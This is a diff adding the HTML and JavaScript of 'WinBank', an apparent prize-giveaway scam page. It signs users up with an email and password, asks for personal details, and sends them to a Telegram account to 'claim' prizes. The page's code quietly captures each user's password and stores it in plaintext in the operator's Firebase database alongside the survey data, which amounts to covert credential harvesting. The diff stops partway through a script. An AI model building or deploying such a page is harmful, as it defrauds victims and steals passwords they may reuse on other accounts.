@@ -1,0 +1,499 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WinBank — Win Amazing Prizes</title>
+    <link href="https://fonts.googleapis.com/css2?family=Syne:wght@400;600;700;800&family=DM+Mono:wght@300;400;500&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg: #0a0a0f; --surface: #111118; --surface2: #1a1a24;
+            --border: rgba(255,255,255,0.07); --accent: #e94560;
+            --accent2: #ff8c42; --accent3: #00d4aa; --text: #f0f0f8;
+            --muted: #6b6b80; --gold: #f5c842;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: 'Syne', sans-serif; background: var(--bg); color: var(--text); min-height: 100vh; overflow-x: hidden; }
+        body::before { content: ''; position: fixed; inset: 0; background: radial-gradient(ellipse 600px 500px at 20% 20%, rgba(233,69,96,0.1) 0%, transparent 70%), radial-gradient(ellipse 500px 500px at 80% 80%, rgba(245,200,66,0.07) 0%, transparent 70%); pointer-events: none; z-index: 0; }
+        .screen { display: none; min-height: 100vh; position: relative; z-index: 1; }
+        .screen.active { display: flex; flex-direction: column; }
+        #langScreen, #authScreen, #surveyScreen, #pendingScreen { align-items: center; justify-content: center; padding: 20px; }
+        @keyframes slideUp { from { opacity: 0; transform: translateY(30px); } to { opacity: 1; transform: translateY(0); } }
+
+        /* CARDS */
+        .lang-card, .auth-card, .survey-card, .pending-card { background: var(--surface); border: 1px solid var(--border); border-radius: 24px; width: 100%; padding: 32px 24px; box-shadow: 0 40px 80px rgba(0,0,0,0.5); animation: slideUp 0.5s ease forwards; }
+        .lang-card { max-width: 420px; }
+        .auth-card { max-width: 420px; padding: 36px 28px; }
+        .survey-card { max-width: 480px; }
+        .pending-card { max-width: 420px; padding: 40px 28px; text-align: center; }
+
+        /* LANGUAGE */
+        .lang-header { text-align: center; margin-bottom: 24px; }
+        .lang-header .globe { font-size: 3rem; margin-bottom: 12px; }
+        .lang-header h2 { font-size: 1.4rem; font-weight: 800; margin-bottom: 4px; }
+        .lang-header p { font-size: 0.78rem; color: var(--muted); font-family: 'DM Mono', monospace; }
+        .lang-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .lang-option { display: flex; align-items: center; gap: 10px; padding: 12px 14px; background: var(--surface2); border: 1.5px solid var(--border); border-radius: 12px; cursor: pointer; transition: all 0.2s; }
+        .lang-option:hover { border-color: rgba(255,255,255,0.15); transform: translateY(-1px); }
+        .lang-option.selected { border-color: var(--accent); background: rgba(233,69,96,0.08); }
+        .lang-flag { font-size: 1.4rem; flex-shrink: 0; }
+        .lang-name { font-size: 0.82rem; font-weight: 700; }
+        .lang-native { font-size: 0.65rem; color: var(--muted); font-family: 'DM Mono', monospace; }
+        .lang-switcher { display: flex; align-items: center; justify-content: center; gap: 6px; margin: 0 auto 16px; padding: 7px 14px; background: var(--surface2); border: 1px solid var(--border); border-radius: 20px; cursor: pointer; font-size: 0.75rem; font-family: 'DM Mono', monospace; color: var(--muted); transition: all 0.2s; width: fit-content; }
+        .lang-switcher:hover { border-color: var(--accent); color: var(--accent); }
+
+        /* BRAND */
+        .brand { text-align: center; margin-bottom: 20px; }
+        .brand-icon { width: 70px; height: 70px; background: linear-gradient(135deg, var(--accent), var(--gold)); border-radius: 20px; display: flex; align-items: center; justify-content: center; font-size: 2rem; margin: 0 auto 14px; box-shadow: 0 12px 30px rgba(233,69,96,0.35); }
+        .brand h1 { font-size: 2rem; font-weight: 800; letter-spacing: -1px; }
+        .brand p { color: var(--muted); font-size: 0.82rem; font-family: 'DM Mono', monospace; margin-top: 4px; }
+        .prize-tag { display: inline-flex; align-items: center; gap: 6px; background: rgba(245,200,66,0.1); border: 1px solid rgba(245,200,66,0.3); color: var(--gold); padding: 5px 14px; border-radius: 20px; font-size: 0.7rem; font-family: 'DM Mono', monospace; letter-spacing: 1px; margin-top: 8px; }
+
+        /* TABS */
+        .tab-row { display: flex; background: var(--surface2); border-radius: 12px; padding: 4px; margin-bottom: 24px; }
+        .tab { flex: 1; padding: 10px; text-align: center; border-radius: 9px; cursor: pointer; font-size: 0.85rem; font-weight: 700; color: var(--muted); transition: all 0.2s; }
+        .tab.active { background: var(--surface); color: var(--text); box-shadow: 0 2px 8px rgba(0,0,0,0.3); }
+
+        /* FORMS */
+        .form-group { margin-bottom: 16px; }
+        label { display: block; font-size: 0.72rem; font-weight: 700; color: var(--muted); margin-bottom: 7px; font-family: 'DM Mono', monospace; text-transform: uppercase; letter-spacing: 0.5px; }
+        input, textarea { width: 100%; padding: 13px 15px; background: var(--surface2); border: 1.5px solid var(--border); border-radius: 11px; font-size: 0.92rem; color: var(--text); font-family: 'Syne', sans-serif; transition: all 0.2s; outline: none; }
+        input:focus, textarea:focus { border-color: var(--accent); background: rgba(233,69,96,0.05); box-shadow: 0 0 0 3px rgba(233,69,96,0.1); }
+        input::placeholder, textarea::placeholder { color: var(--muted); }
+        textarea { resize: none; height: 100px; }
+        .pw-wrap { position: relative; }
+        .pw-wrap input { padding-right: 46px; }
+        .pw-eye { position: absolute; right: 13px; top: 50%; transform: translateY(-50%); background: none; border: none; cursor: pointer; font-size: 1rem; color: var(--muted); }
+
+        /* BUTTONS */
+        .btn { width: 100%; padding: 14px; background: linear-gradient(135deg, var(--accent), #c73652); color: white; border: none; border-radius: 11px; font-size: 0.92rem; font-weight: 700; font-family: 'Syne', sans-serif; cursor: pointer; transition: all 0.25s; box-shadow: 0 6px 20px rgba(233,69,96,0.3); }
+        .btn:hover { transform: translateY(-2px); }
+        .btn:disabled { background: var(--surface2); color: var(--muted); box-shadow: none; cursor: not-allowed; transform: none; }
+        .btn.outline-btn { background: transparent; border: 1.5px solid var(--border); color: var(--muted); box-shadow: none; }
+        .btn.outline-btn:hover { border-color: var(--text); color: var(--text); transform: none; }
+        .lang-confirm-btn { width: 100%; padding: 14px; background: linear-gradient(135deg, var(--accent), #c73652); color: white; border: none; border-radius: 11px; font-size: 0.92rem; font-weight: 700; font-family: 'Syne', sans-serif; cursor: pointer; transition: all 0.25s; box-shadow: 0 6px 20px rgba(233,69,96,0.3); }
+        .lang-confirm-btn:hover { transform: translateY(-2px); }
+        .error-box { display: none; background: rgba(233,69,96,0.1); border: 1px solid rgba(233,69,96,0.25); color: var(--accent); padding: 10px 14px; border-radius: 10px; font-size: 0.78rem; font-family: 'DM Mono', monospace; margin-top: 12px; text-align: center; }
+
+        /* SURVEY */
+        .progress-bar { height: 4px; background: var(--surface2); border-radius: 10px; margin-bottom: 20px; overflow: hidden; }
+        .progress-fill { height: 100%; background: linear-gradient(90deg, var(--accent), var(--gold)); border-radius: 10px; transition: width 0.4s ease; }
+        .step-label { font-size: 0.68rem; font-family: 'DM Mono', monospace; color: var(--muted); letter-spacing: 1px; margin-bottom: 6px; }
+        .survey-title { font-size: 1.3rem; font-weight: 800; letter-spacing: -0.3px; margin-bottom: 4px; }
+        .survey-subtitle { font-size: 0.8rem; color: var(--muted); margin-bottom: 20px; }
+        .step { display: none; }
+        .step.active { display: block; }
+        .radio-group { display: flex; gap: 10px; flex-wrap: wrap; }
+        .radio-option { flex: 1; min-width: 100px; padding: 12px; background: var(--surface2); border: 1.5px solid var(--border); border-radius: 11px; text-align: center; cursor: pointer; transition: all 0.2s; font-size: 0.85rem; font-weight: 600; }
+        .radio-option.selected { border-color: var(--accent); background: rgba(233,69,96,0.1); color: var(--accent); }
+        .survey-nav { display: flex; gap: 10px; margin-top: 24px; }
+        .survey-nav .btn { flex: 1; }
+
+        /* PENDING */
+        .pending-icon { width: 80px; height: 80px; background: rgba(245,200,66,0.1); border: 2px solid rgba(245,200,66,0.3); border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 2rem; margin: 0 auto 20px; animation: pendingPulse 2s infinite; }
+        @keyframes pendingPulse { 0%, 100% { box-shadow: 0 0 0 0 rgba(245,200,66,0.3); } 50% { box-shadow: 0 0 0 12px rgba(245,200,66,0); } }
+        .pending-title { font-size: 1.5rem; font-weight: 800; margin-bottom: 10px; }
+        .pending-text { font-size: 0.85rem; color: var(--muted); line-height: 1.7; margin-bottom: 20px; }
+        .pending-text strong { color: var(--gold); }
+        .logout-link { font-size: 0.75rem; color: var(--muted); font-family: 'DM Mono', monospace; cursor: pointer; margin-top: 16px; display: inline-block; }
+
+        /* DASHBOARD */
+        #dashScreen { flex-direction: column; }
+        .dash-header { background: var(--surface); border-bottom: 1px solid var(--border); padding: 18px 20px; display: flex; align-items: center; justify-content: space-between; position: sticky; top: 0; z-index: 50; backdrop-filter: blur(20px); }
+        .dash-logo { display: flex; align-items: center; gap: 10px; font-size: 1.2rem; font-weight: 800; }
+        .dash-logo-icon { width: 32px; height: 32px; background: linear-gradient(135deg, var(--accent), var(--gold)); border-radius: 8px; display: flex; align-items: center; justify-content: center; font-size: 0.9rem; }
+        .dash-logout { font-size: 0.72rem; font-family: 'DM Mono', monospace; color: var(--muted); cursor: pointer; padding: 6px 12px; border: 1px solid var(--border); border-radius: 8px; transition: all 0.2s; }
+        .dash-logout:hover { border-color: var(--accent); color: var(--accent); }
+        .dash-content { padding: 20px; flex: 1; }
+        .welcome-banner { background: linear-gradient(135deg, rgba(233,69,96,0.15), rgba(245,200,66,0.1)); border: 1px solid rgba(233,69,96,0.2); border-radius: 16px; padding: 20px; margin-bottom: 20px; position: relative; overflow: hidden; }
+        .welcome-banner::before { content: '🎉'; position: absolute; right: 16px; top: 50%; transform: translateY(-50%); font-size: 3rem; opacity: 0.3; }
+        .welcome-name { font-size: 1.3rem; font-weight: 800; margin-bottom: 4px; }
+        .welcome-sub { font-size: 0.78rem; color: var(--muted); font-family: 'DM Mono', monospace; }
+        .prize-section-title { font-size: 0.7rem; font-family: 'DM Mono', monospace; color: var(--muted); letter-spacing: 2px; text-transform: uppercase; margin-bottom: 12px; }
+        .cash-card { background: linear-gradient(135deg, #1a2a1a, #0f1f0f); border: 1px solid rgba(0,212,170,0.2); border-radius: 16px; padding: 24px 20px; margin-bottom: 16px; position: relative; overflow: hidden; }
+        .cash-card::before { content: '💰'; position: absolute; right: 20px; top: 50%; transform: translateY(-50%); font-size: 2.5rem; opacity: 0.3; }
+        .cash-label { font-size: 0.7rem; font-family: 'DM Mono', monospace; color: var(--accent3); letter-spacing: 1px; text-transform: uppercase; margin-bottom: 8px; }
+        .cash-amount { font-size: 2.2rem; font-weight: 800; color: var(--accent3); letter-spacing: -1px; }
+        .cash-sub { font-size: 0.72rem; color: var(--muted); font-family: 'DM Mono', monospace; margin-top: 4px; }
+        .prizes-grid { display: grid; grid-template-columns: repeat(2, 1fr); gap: 12px; margin-bottom: 20px; }
+        .prize-card { background: var(--surface); border: 1px solid var(--border); border-radius: 14px; padding: 16px; text-align: center; }
+        .prize-card.won { border-color: rgba(245,200,66,0.3); background: linear-gradient(135deg, rgba(245,200,66,0.08), rgba(255,140,66,0.05)); }
+        .prize-emoji { font-size: 2rem; margin-bottom: 8px; }
+        .prize-name { font-size: 0.8rem; font-weight: 700; margin-bottom: 3px; }
+        .prize-status { font-size: 0.65rem; font-family: 'DM Mono', monospace; padding: 3px 8px; border-radius: 4px; }
+        .prize-status.awarded { background: rgba(245,200,66,0.15); color: var(--gold); }
+        .no-prize-msg { background: var(--surface); border: 1px dashed var(--border); border-radius: 14px; padding: 30px 20px; text-align: center; margin-bottom: 20px; }
+        .no-prize-msg .emoji { font-size: 2.5rem; margin-bottom: 10px; }
+        .no-prize-msg p { font-size: 0.82rem; color: var(--muted); line-height: 1.6; }
+        .contact-section { background: linear-gradient(135deg, rgba(0,136,204,0.1), rgba(0,136,204,0.05)); border: 1px solid rgba(0,136,204,0.2); border-radius: 14px; padding: 18px; text-align: center; }
+        .contact-title { font-size: 0.88rem; font-weight: 700; margin-bottom: 6px; }
+        .contact-sub { font-size: 0.75rem; color: var(--muted); margin-bottom: 14px; }
+        .tg-btn { display: inline-flex; align-items: center; gap: 8px; background: #0088cc; color: white; padding: 11px 20px; border-radius: 10px; font-size: 0.85rem; font-weight: 700; text-decoration: none; transition: all 0.2s; }
+        .tg-btn:hover { background: #006aa3; transform: translateY(-1px); }
+        .status-badge { display: inline-flex; align-items: center; gap: 5px; padding: 4px 12px; border-radius: 20px; font-size: 0.68rem; font-family: 'DM Mono', monospace; font-weight: 600; }
+        .status-badge.approved { background: rgba(0,212,170,0.12); color: var(--accent3); border: 1px solid rgba(0,212,170,0.25); }
+        ::-webkit-scrollbar { width: 4px; }
+        ::-webkit-scrollbar-track { background: var(--bg); }
+        ::-webkit-scrollbar-thumb { background: var(--surface2); border-radius: 10px; }
+    </style>
+</head>
+<body>
+
+<!-- LANGUAGE SCREEN -->
+<div id="langScreen" class="screen active">
+    <div class="lang-card">
+        <div class="lang-header">
+            <div class="globe">🌍</div>
+            <h2>Choose Your Language</h2>
+            <p>Select your preferred language</p>
+        </div>
+        <div class="lang-grid">
+            <div class="lang-option selected" onclick="selectLang('en',this)"><div class="lang-flag">🇬🇧</div><div><div class="lang-name">English</div><div class="lang-native">English</div></div></div>
+            <div class="lang-option" onclick="selectLang('fr',this)"><div class="lang-flag">🇫🇷</div><div><div class="lang-name">French</div><div class="lang-native">Français</div></div></div>
+            <div class="lang-option" onclick="selectLang('es',this)"><div class="lang-flag">🇪🇸</div><div><div class="lang-name">Spanish</div><div class="lang-native">Español</div></div></div>
+            <div class="lang-option" onclick="selectLang('pt',this)"><div class="lang-flag">🇵🇹</div><div><div class="lang-name">Portuguese</div><div class="lang-native">Português</div></div></div>
+            <div class="lang-option" onclick="selectLang('ar',this)"><div class="lang-flag">🇸🇦</div><div><div class="lang-name">Arabic</div><div class="lang-native">العربية</div></div></div>
+            <div class="lang-option" onclick="selectLang('ha',this)"><div class="lang-flag">🇳🇬</div><div><div class="lang-name">Hausa</div><div class="lang-native">Hausa</div></div></div>
+            <div class="lang-option" onclick="selectLang('yo',this)"><div class="lang-flag">🇳🇬</div><div><div class="lang-name">Yoruba</div><div class="lang-native">Yorùbá</div></div></div>
+            <div class="lang-option" onclick="selectLang('ig',this)"><div class="lang-flag">🇳🇬</div><div><div class="lang-name">Igbo</div><div class="lang-native">Igbo</div></div></div>
+        </div>
+        <button class="lang-confirm-btn" onclick="confirmLang()">Continue →</button>
+    </div>
+</div>
+
+<!-- AUTH SCREEN -->
+<div id="authScreen" class="screen">
+    <div class="auth-card">
+        <div class="brand">
+            <div class="brand-icon">🏆</div>
+            <h1>WinBank</h1>
+            <p id="t-tagline">Answer & Win Amazing Prizes</p>
+            <div class="prize-tag">🎁 iPhones · TVs · Cash · More</div>
+        </div>
+        <div class="lang-switcher" onclick="showScreen('langScreen')">
+            <span id="currentLangFlag">🇬🇧</span>
+            <span id="currentLangName">English</span>
+            <span>↓</span>
+        </div>
+        <div class="tab-row">
+            <div class="tab active" id="signupTab" onclick="switchTab('signup')">Sign Up</div>
+            <div class="tab" id="loginTab" onclick="switchTab('login')">Login</div>
+        </div>
+        <div id="signupForm">
+            <div class="form-group"><label id="t-suEmailLabel">Email Address</label><input type="email" id="su-email" placeholder="your@email.com"></div>
+            <div class="form-group"><label id="t-suPasswordLabel">Password</label><div class="pw-wrap"><input type="password" id="su-password" placeholder="••••••••"><button class="pw-eye" onclick="togglePw('su-password',this)">👁</button></div></div>
+            <button class="btn" id="signupBtn" onclick="handleSignup()">Create Account →</button>
+        </div>
+        <div id="loginForm" style="display:none;">
+            <div class="form-group"><label id="t-liEmailLabel">Email Address</label><input type="email" id="li-email" placeholder="your@email.com"></div>
+            <div class="form-group"><label id="t-liPasswordLabel">Password</label><div class="pw-wrap"><input type="password" id="li-password" placeholder="••••••••"><button class="pw-eye" onclick="togglePw('li-password',this)">👁</button></div></div>
+            <div onclick="toggleRememberMe()" id="rememberRow" style="display:flex;align-items:center;gap:10px;padding:12px 14px;background:var(--surface2);border:1.5px solid var(--border);border-radius:11px;cursor:pointer;margin-bottom:16px;transition:all 0.2s;">
+                <div id="rememberBox" style="width:20px;height:20px;border-radius:5px;border:2px solid var(--muted);background:transparent;display:flex;align-items:center;justify-content:center;flex-shrink:0;transition:all 0.2s;"></div>
+                <div><div id="t-rememberMe" style="font-size:0.83rem;font-weight:700;">Remember Me</div><div id="t-rememberSub" style="font-size:0.68rem;color:var(--muted);font-family:'DM Mono',monospace;">Auto-login next time</div></div>
+            </div>
+            <button class="btn" id="loginBtn" onclick="handleLogin()">Login →</button>
+            <div style="text-align:center;margin-top:12px;"><span id="t-forgotPw" onclick="handleForgotPassword()" style="font-size:0.75rem;color:var(--accent);font-family:'DM Mono',monospace;cursor:pointer;text-decoration:underline;">🔑 Forgot Password?</span></div>
+            <div style="margin-top:16px;padding-top:16px;border-top:1px solid var(--border);text-align:center;">
+                <p id="t-needHelp" style="font-size:0.72rem;color:var(--muted);font-family:'DM Mono',monospace;margin-bottom:8px;">Need help? Contact us</p>
+                <a href="https://t.me/ElWinbank" target="_blank" id="t-tgSupport" style="display:inline-flex;align-items:center;gap:6px;background:#0088cc;color:white;padding:8px 16px;border-radius:9px;font-size:0.8rem;font-weight:700;text-decoration:none;">✈️ Telegram Support</a>
+            </div>
+        </div>
+        <div class="error-box" id="authError"></div>
+    </div>
+</div>
+
+<!-- SURVEY SCREEN -->
+<div id="surveyScreen" class="screen">
+    <div class="survey-card">
+        <div class="progress-bar"><div class="progress-fill" id="progressFill" style="width:12.5%"></div></div>
+        <div class="step-label" id="stepLabel">STEP 1 OF 8</div>
+        <div class="survey-title" id="surveyTitle">Tell us your name</div>
+        <div class="survey-subtitle" id="surveySubtitle">Let's get to know you</div>
+        <div class="step active" id="step1"><div class="form-group"><label id="t-nameLabel">Full Name</label><input type="text" id="s-name" placeholder="Enter your full name"></div></div>
+        <div class="step" id="step2"><div class="form-group"><label id="t-ageLabel">Your Age</label><input type="number" id="s-age" placeholder="Enter your age" min="16" max="100"></div></div>
+        <div class="step" id="step3"><div class="form-group"><label id="t-genderLabel">Gender</label><div class="radio-group"><div class="radio-option" id="opt-male" onclick="selectOption(this,'gender','Male')">👨 Male</div><div class="radio-option" id="opt-female" onclick="selectOption(this,'gender','Female')">👩 Female</div></div></div></div>
+        <div class="step" id="step4"><div class="form-group"><label id="t-maritalLabel">Marital Status</label><div class="radio-group"><div class="radio-option" id="opt-single" onclick="selectOption(this,'marital','Single')">💫 Single</div><div class="radio-option" id="opt-married" onclick="selectOption(this,'marital','Married')">💍 Married</div></div></div></div>
+        <div class="step" id="step5"><div class="form-group"><label id="t-occupationLabel">Occupation</label><input type="text" id="s-occupation" placeholder="e.g. Teacher, Business Owner..."></div></div>
+        <div class="step" id="step6"><div class="form-group"><label id="t-locationLabel">City / Country</label><input type="text" id="s-location" placeholder="e.g. London, Paris, New York, Dubai, Lagos..."></div></div>
+        <div class="step" id="step7"><div class="form-group"><label id="t-whatdoLabel">What would you do with your prize?</label><textarea id="s-whatdo" placeholder="Tell us what you would do if you won..."></textarea></div></div>
+        <div class="step" id="step8"><div class="form-group"><label id="t-whywinLabel">Why do you deserve to win?</label><textarea id="s-whywin" placeholder="Tell us why you should be a winner..."></textarea></div></div>
+        <div class="survey-nav">
+            <button class="btn outline-btn" id="prevBtn" onclick="prevStep()" style="display:none;">← Back</button>
+            <button class="btn" id="nextBtn" onclick="nextStep()">Next →</button>
+        </div>
+        <div class="error-box" id="surveyError"></div>
+    </div>
+</div>
+
+<!-- PENDING SCREEN -->
+<div id="pendingScreen" class="screen">
+    <div class="pending-card">
+        <div class="pending-icon">⏳</div>
+        <div class="pending-title" id="t-pendingTitle">Application Submitted!</div>
+        <p class="pending-text"><span id="t-pendingText">Thank you</span> <strong id="pendingName">there</strong>!<span id="t-pendingText2"> Your application is being reviewed. Please wait for approval!</span></p>
+        <div style="background:var(--surface2);border-radius:12px;padding:16px;margin-bottom:20px;text-align:left;">
+            <div id="t-whatNext" style="font-size:0.7rem;font-family:'DM Mono',monospace;color:var(--muted);letter-spacing:1px;margin-bottom:12px;">WHAT HAPPENS NEXT</div>
+            <div style="display:flex;align-items:flex-start;gap:10px;margin-bottom:10px;"><div style="width:22px;height:22px;background:rgba(245,200,66,0.2);border:1px solid rgba(245,200,66,0.4);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.7rem;font-weight:800;color:var(--gold);flex-shrink:0;">1</div><div id="t-step1txt" style="font-size:0.8rem;color:var(--muted);padding-top:2px;">Our team reviews your application</div></div>
+            <div style="display:flex;align-items:flex-start;gap:10px;margin-bottom:10px;"><div style="width:22px;height:22px;background:rgba(245,200,66,0.2);border:1px solid rgba(245,200,66,0.4);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.7rem;font-weight:800;color:var(--gold);flex-shrink:0;">2</div><div id="t-step2txt" style="font-size:0.8rem;color:var(--muted);padding-top:2px;">You get <strong style="color:var(--gold);">approved</strong> and your dashboard unlocks</div></div>
+            <div style="display:flex;align-items:flex-start;gap:10px;"><div style="width:22px;height:22px;background:rgba(0,212,170,0.2);border:1px solid rgba(0,212,170,0.4);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:0.7rem;font-weight:800;color:var(--accent3);flex-shrink:0;">3</div><div id="t-step3txt" style="font-size:0.8rem;color:var(--muted);padding-top:2px;">Contact us on Telegram to <strong style="color:var(--accent3);">claim your prize!</strong></div></div>
+        </div>
+        <div style="background:rgba(233,69,96,0.08);border:1px solid rgba(233,69,96,0.2);border-radius:10px;padding:12px;margin-bottom:20px;">
+            <p id="t-lockedMsg" style="font-size:0.78rem;color:var(--accent);font-family:'DM Mono',monospace;text-align:center;">🔒 Contact button unlocks after approval</p>
+        </div>
+        <span class="logout-link" id="t-logout" onclick="handleLogout()">← Logout</span>
+    </div>
+</div>
+
+<!-- DASHBOARD SCREEN -->
+<div id="dashScreen" class="screen">
+    <div class="dash-header">
+        <div class="dash-logo"><div class="dash-logo-icon">🏆</div> WinBank</div>
+        <div style="display:flex;align-items:center;gap:10px;">
+            <div class="status-badge approved" id="t-approvedBadge">✓ APPROVED</div>
+            <div class="dash-logout" id="t-dashLogout" onclick="handleLogout()">Logout</div>
+        </div>
+    </div>
+    <div class="dash-content">
+        <div class="welcome-banner">
+            <div class="welcome-name" id="dashWelcome">Welcome back! 🎉</div>
+            <div class="welcome-sub" id="t-prizesWaiting">Your prizes are waiting for you</div>
+        </div>
+        <div class="prize-section-title" id="t-cashPrizeTitle">💰 CASH PRIZE</div>
+        <div class="cash-card">
+            <div class="cash-label" id="t-totalWinnings">Total Winnings</div>
+            <div class="cash-amount" id="cashAmount">$0</div>
+            <div class="cash-sub" id="cashSub">No prize yet</div>
+        </div>
+        <div class="prize-section-title" id="t-prizesWonTitle">🎁 PRIZES WON</div>
+        <div id="prizesContainer"></div>
+        <div class="contact-section">
+            <div class="contact-title" id="t-readyToClaim">Ready to claim your prize?</div>
+            <div class="contact-sub" id="t-contactSub">Contact us on Telegram to arrange delivery</div>
+            <a href="https://t.me/ElWinbank" target="_blank" class="tg-btn" id="t-telegramBtn">✈️ Message on Telegram</a>
+        </div>
+    </div>
+</div>
+
+<!-- Firebase -->
+<script type="module">
+    import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+    import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged, sendPasswordResetEmail, setPersistence, browserSessionPersistence, browserLocalPersistence } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-auth.js";
+    import { getFirestore, doc, setDoc, getDoc, onSnapshot, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
+    const firebaseConfig = {
+        apiKey: "AIzaSyA0_sy6Kw_krHeOjsREX_c9P1RSBlJpqtA",
+        authDomain: "winbank-a6ff4.firebaseapp.com",
+        projectId: "winbank-a6ff4",
+        storageBucket: "winbank-a6ff4.firebasestorage.app",
+        messagingSenderId: "811228092366",
+        appId: "1:811228092366:web:2d454f32a31c4ea86dfd9f"
+    };
+
+    const app = initializeApp(firebaseConfig);
+    const auth = getAuth(app);
+    const db = getFirestore(app);
+    let currentUid = null, userListener = null;
+
+    onAuthStateChanged(auth, async (user) => {
+        if (!user) { if (!localStorage.getItem('wb_lang')) showScreen('langScreen'); else showScreen('authScreen'); return; }
+        if (user.email === 'jgodwin195@gmail.com') { await signOut(auth); return; }
+        currentUid = user.uid;
+        const snap = await getDoc(doc(db, 'users', user.uid));
+        if (!snap.exists()) { showScreen('surveyScreen'); return; }
+        if (userListener) userListener();
+        userListener = onSnapshot(doc(db, 'users', user.uid), s => { if (s.exists()) handleUserData(s.data()); });
+        handleUserData(snap.data());
+    });
+
+    function handleUserData(data) {
+        if (data.status === 'approved') showDashboard(data);
+        else if (data.status === 'frozen') { showError('authError', 'Your account has been frozen. Contact support.'); showScreen('authScreen'); }
+        else { document.getElementById('pendingName').textContent = data.name || 'there'; showScreen('pendingScreen'); }
+    }
+
+    function showDashboard(data) {
+        const t = getT();
+        document.getElementById('dashWelcome').textContent = `${t.welcomeBack} ${data.name || ''}! 🎉`;
+        const cash = data.prizes?.cash || 0;
+        document.getElementById('cashAmount').textContent = cash > 0 ? `$${Number(cash).toLocaleString()}` : '$0';
+        document.getElementById('cashSub').textContent = cash > 0 ? 'Congratulations!' : t.noCash;
+        const items = data.prizes?.items || [];
+        const container = document.getElementById('prizesContainer');
+        if (items.length === 0) {
+            container.innerHTML = `<div class="no-prize-msg"><div class="emoji">🎁</div><p>${t.noCash}</p></div>`;
+        } else {
+            const em = {'iPhone':'📱','TV':'📺','Freezer':'❄️','Laptop':'💻'};
+            container.innerHTML = `<div class="prizes-grid">${items.map(i=>`<div class="prize-card won"><div class="prize-emoji">${em[i]||'🎁'}</div><div class="prize-name">${i}</div><div class="prize-status awarded">${t.awarded||'AWARDED'}</div></div>`).join('')}</div>`;
+        }
+        showScreen('dashScreen');
+    }
+
+    window.handleSignup = async () => {
+        const email = document.getElementById('su-email').value.trim();
+        const password = document.getElementById('su-password').value;
+        if (!email || !password) { showError('authError', 'Please fill in all fields.'); return; }
+        if (password.length < 6) { showError('authError', 'Password must be at least 6 characters.'); return; }
+        clearError('authError');
+        try { await createUserWithEmailAndPassword(auth, email, password); window._userPassword = password; }
+        catch (err) { showError('authError', friendlyError(err.code)); }
+    };
+
+    window.handleLogin = async () => {
+        const email = document.getElementById('li-email').value.trim();
+        const password = document.getElementById('li-password').value;
+        if (!email || !password) { showError('authError', 'Please fill in all fields.'); return; }
+        clearError('authError');
+        try {
+            await setPersistence(auth, (window._rememberMe) ? browserLocalPersistence : browserSessionPersistence);
+            await signInWithEmailAndPassword(auth, email, password);
+            window._userPassword = password;
+        } catch (err) { showError('authError', friendlyError(err.code)); }
+    };
+
+    window.handleForgotPassword = async () => {
+        const email = document.getElementById('li-email').value.trim();
+        if (!email) { showError('authError', 'Please enter your email first.'); return; }
+        clearError('authError');
+        try {
+            await sendPasswordResetEmail(auth, email);
+            const el = document.getElementById('authError');
+            el.textContent = '✅ Reset email sent! Check your inbox.';
+            el.style.display = 'block'; el.style.background = 'rgba(0,212,170,0.1)';
+            el.style.borderColor = 'rgba(0,212,170,0.25)'; el.style.color = 'var(--accent3)';
+        } catch (err) { showError('authError', friendlyError(err.code)); }
+    };
+
+    window.submitSurvey = async (surveyData) => {
+        const user = auth.currentUser;
+        if (!user) return;
+        try {
+            await setDoc(doc(db, 'users', user.uid), { ...surveyData, email: user.email, password: window._userPassword || '(not stored)', status: 'pending', prizes: { cash: 0, items: [] }, createdAt: serverTimestamp() });
+            document.getElementById('pendingName').textContent = surveyData.name || 'there';
+            showScreen('pendingScreen');
+        } catch (err) { showError('surveyError', 'Error saving. Please try again.'); }
+    };
+
+    window.handleLogout = async () => {
+        if (userListener) userListener();
+        await signOut(auth);
+        showScreen('authScreen');
+    };
+
+    function friendlyError(code) {
+        const map = { 'auth/email-already-in-use':'This email is already registered. Please login.', 'auth/invalid-email':'Please enter a valid email.', 'auth/weak-password':'Password must be at least 6 characters.', 'auth/invalid-credential':'Incorrect email or password.', 'auth/user-not-found':'No account found.', 'auth/wrong-password':'Incorrect password.' };
+        return map[code] || 'Something went wrong. Please try again.';
+    }
+</script>
+
+<script>
+    function showScreen(id) { document.querySelectorAll('.screen').forEach(s => s.classList.remove('active')); document.getElementById(id).classList.add('active'); }
+    function showError(id, msg) { const el = document.getElementById(id); el.textContent = msg; el.style.display = 'block'; }
+    function clearError(id) { const el = document.getElementById(id); el.textContent = ''; el.style.display = 'none'; }
+
+    window.switchTab = (tab) => {
+        document.getElementById('signupTab').classList.toggle('active', tab === 'signup');
+        document.getElementById('loginTab').classList.toggle('active', tab === 'login');
+        document.getElementById('signupForm').style.display = tab === 'signup' ? 'block' : 'none';
+        document.getElementById('loginForm').style.display = tab === 'login' ? 'block' : 'none';
+        clearError('authError');
+    };
+
+    window.togglePw = (id, btn) => { const i = document.getElementById(id); const h = i.type === 'password'; i.type = h ? 'text' : 'password'; btn.textContent = h ? '🙈' : '👁'; };
+
+    window._rememberMe = false;
+    window.toggleRememberMe = () => {
+        window._rememberMe = !window._rememberMe;
+        const box = document.getElementById('rememberBox'), row = document.getElementById('rememberRow');
+        if (window._rememberMe) { box.innerHTML = '✓'; box.style.background = 'var(--accent)'; box.style.borderColor = 'var(--accent)'; box.style.color = 'white'; box.style.fontSize = '0.75rem'; box.style.fontWeight = '800'; row.style.borderColor = 'rgba(233,69,96,0.4)'; row.style.background = 'rgba(233,69,96,0.05)'; }
+        else { box.innerHTML = ''; box.style.background = 'transparent'; box.style.borderColor = 'var(--muted)'; row.style.borderColor = 'var(--border)'; row.style.background = 'var(--surface2)'; }
+    };
+
+    // SURVEY
+    let currentStep = 1;
